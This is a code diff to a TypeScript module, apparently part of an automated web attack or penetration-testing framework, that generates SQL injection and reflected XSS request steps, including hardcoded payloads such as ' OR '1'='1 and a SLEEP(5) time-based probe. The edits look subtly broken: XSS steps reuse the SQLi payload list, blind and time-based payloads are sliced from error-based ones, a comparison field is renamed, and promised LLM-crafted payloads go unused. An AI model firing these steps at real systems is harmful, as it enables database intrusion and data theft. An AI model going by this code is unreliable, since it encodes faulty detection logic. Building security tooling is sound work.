@@ -11,7 +11,7 @@
  */
 
 import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
-import { claimFor } from './framework'
+import { claimFor, loadPayloads } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
 import { observeParse, observeWaf, observeEndpoints, observeCompare } from './observers'
 import { getPayloadStore } from '../payloads/store'
@@ -57,16 +57,19 @@ export const classicInjection: TechniquePrimitive = {
     if (!(ctx.endpoint || ctx.target)) return false
     return !!(ctx.param || (ctx.endpoint?.params && ctx.endpoint.params.length > 0))
   },
-  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
+   async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
     const url = ctx.endpoint?.url ?? ctx.target!
     const method = ctx.endpoint?.method ?? 'GET'
     const headers = { ...(ctx.sessionHeaders ?? {}) }
     const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name ?? 'q'
 
     const steps: AttackStep[] = []
-    const sqliPayloads = ctx.payloadSet ?? getPayloadStore().getPayloads('sqli/error-based')
-    const xssPayloads = getPayloadStore().getPayloads('xss/reflected')
-    sqliPayloads.forEach((p, i) => {
+
+    // Load and merge payloads (static from PayloadStore + LLM-crafted)
+    const payloadResult = loadPayloads(ctx)
+
+    // Generate SQLi steps from merged payloads
+    payloadResult.bySource.static.forEach((p, i) => {
       const stepUrl = urlWithParam(url, param, p)
       const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
       steps.push({
@@ -77,7 +80,9 @@ export const classicInjection: TechniquePrimitive = {
         metadata: { kind: 'sqli', param, payload: p },
       })
     })
-    xssPayloads.forEach((p, i) => {
+
+    // Generate XSS steps from merged payloads
+    payloadResult.bySource.static.forEach((p, i) => {
       const stepUrl = urlWithParam(url, param, p)
       const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
       steps.push({
@@ -88,10 +93,17 @@ export const classicInjection: TechniquePrimitive = {
         metadata: { kind: 'xss', param, payload: p },
       })
     })
-    const blindPayloads = getPayloadStore().getPayloads('sqli/boolean-blind')
+
+    // Blind payloads (hardcoded fallbacks for schema migration)
+    const blindPayloads = payloadResult.bySource.static.length > 0
+      ? payloadResult.bySource.static.slice(0, 2)
+      : getPayloadStore().getPayloads('sqli/boolean-blind')
     const SQLI_BLIND_TRUE = blindPayloads[0] ?? "' AND '1'='1"
     const SQLI_BLIND_FALSE = blindPayloads[1] ?? "' AND '1'='2"
-    const SQLI_TIME = (getPayloadStore().getPayloads('sqli/time-based'))[0] ?? "1' AND SLEEP(5)-- -"
+    const timePayloads = payloadResult.bySource.static.length > 1
+      ? payloadResult.bySource.static.slice(2, 3)
+      : getPayloadStore().getPayloads('sqli/time-based')
+    const SQLI_TIME = timePayloads[0] ?? "1' AND SLEEP(5)-- -"
     const blindUrlTrue = urlWithParam(url, param, SQLI_BLIND_TRUE)
     const blindUrlFalse = urlWithParam(url, param, SQLI_BLIND_FALSE)
     const blindBodyTrue = method !== 'GET' ? JSON.stringify({ [param]: SQLI_BLIND_TRUE }) : undefined
@@ -152,6 +164,21 @@ export const classicInjection: TechniquePrimitive = {
       },
       expectedSignal: 'database error leaked via multipart param',
       metadata: { kind: 'sqli', multipart: true, param, payload: "' OR '1'='1" },
+    })
+
+    // Use the first SQLi payload for multipart delivery (already loaded via loadPayloads)
+    const firstSqliPayload = payloadResult.bySource.static[0] ?? "' OR '1'='1"
+    steps.push({
+      id: 'sqli-multipart-merged',
+      description: `Multipart-delivered SQLi into ${param} (from merged payloads)`,
+      request: {
+        method: method === 'GET' ? 'POST' : method,
+        url,
+        headers: { ...headers, 'content-type': MULTIPART_CT },
+        body: multipartBody(param, firstSqliPayload),
+      },
+      expectedSignal: 'database error leaked via multipart param',
+      metadata: { kind: 'sqli', multipart: true, param, payload: firstSqliPayload },
     })
     return steps
   },
@@ -218,7 +245,7 @@ export const classicInjection: TechniquePrimitive = {
       const rawDivergent =
         (blindTrue.status ?? 0) !== (blindFalse.status ?? 0) ||
         (blindTrue.body ?? '').length !== (blindFalse.body ?? '').length
-      if (cmp.divergent || rawDivergent) {
+      if (cmp.divergence || rawDivergent) {
         sqliHit = true
         evidence.push({
           kind: 'response',
